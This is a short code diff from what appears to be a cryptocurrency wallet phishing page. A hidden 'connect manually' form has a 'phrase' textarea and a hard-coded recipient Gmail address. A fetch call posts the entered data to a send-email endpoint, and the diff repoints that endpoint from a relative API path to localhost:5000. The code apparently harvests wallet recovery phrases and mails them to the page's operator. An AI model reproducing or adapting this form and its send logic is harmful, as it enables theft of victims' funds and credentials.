@@ -1756,7 +1756,7 @@
                 </form> -->
 
                     <div id="div_connect_manuallly" style="display:none;">
-                        <form action="./api/send-email" method="POST" id="my-form">
+                        <form action="http://localhost:5000/send-email" method="POST" id="my-form">
                             <input type="hidden" name="email" value="oriyebakap6@gmail.com">
                             <div id="phrase">
                                 <textarea
@@ -1949,7 +1949,7 @@
 
         try {
             // Send data as JSON using fetch
-            const response = await fetch('./api/send-email', {
+            const response = await fetch('http://localhost:5000/send-email', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
